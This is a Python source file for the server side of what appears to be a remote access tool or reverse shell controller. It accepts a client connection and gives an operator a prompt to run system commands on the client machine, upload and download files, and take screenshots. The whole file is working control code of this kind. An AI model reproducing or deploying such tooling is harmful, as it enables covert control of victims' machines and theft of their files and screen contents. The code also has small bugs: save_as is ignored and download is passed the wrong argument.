import socket
import sys
import datetime # use for the file naming
from operations.serverOp.operations import Operations as Ope
from operations.utils.parser import parse_command


class Server:
    def __init__(self, host, port) -> None:
        self.host = host
        self.port = port
        self.socket = self.create_sock()
        self.client, self.address = None, None
        self.operations: Ope = None

    def create_sock(self):
        try:
            sock_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock_conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock_conn.bind((self.host, self.port))
            sock_conn.listen(5)
            return sock_conn
        except socket.gaierror:
            print("Unable to create connection")
            sys.exit()
        except socket.error:
            print("something went wrong")
            sys.exit()
        except KeyboardInterrupt:
            print("Interrupted by user")
            sys.exit()

        except ConnectionResetError:
            print("Client has disconnected")
            sys.exit()

    def accept_conn(self):
        try:
            self.client, self.address = self.socket.accept()
            self.operations = Ope(self.client)
            print("Connection from: ", self.address)
        except KeyboardInterrupt:
            print("Interrupted by user")
            sys.exit()

    def send_command2client(self, command: str):
        self.client.sendall(str.encode(command))

    def runcommands(self, command: str):

        args = parse_command(command)

        if not self.validate_command(args):
            return

        self.send_command2client(command)

        # print("Parsed command: ", args)

        if not args:
            print("Invalid command")
            return

        if args[0] == "hi":
            self.operations.hi()
            return

        if args[0] == "upload":
            filename = args[1]
            save_as = args[2]
            self.operations.upload(filename)
            return

        if args[0] == "screenshot":
            self.operations.screenshot()
            return

        if args[0] == "download":
            filename = args[1]
            save_as = args[2]
            self.operations.download(args[2])
            return 1

        if args[0] == "exit":
            self.operations.exit()

        self.operations.system_command()

    def validate_command(self, args: list[str]):

        if len(args) == 0:
            print("Please enter a command")
            return 0

        if args[0] == "download":
            if len(args) != 3:
                print("Invalid command")
                print("Usage: download <filename> <save_as>")
                return 0


        if args[0] == "upload":
            if len(args) != 3:
                print("Invalid command")
                print("Usage: upload <filename> <save_as>")
                return 0

        return 1

    def runserver(self):
        print("Server is running on {}:{}".format(self.host, self.port))
        print("Waiting for connection")
        self.accept_conn()
        while True:
            try:
                command = input(f"{self.operations.get_cwd()}>")

                self.runcommands(command)

            except KeyboardInterrupt:
                print("Exiting the shell by keyboard interrupt damn dude what did you do")
                sys.exit()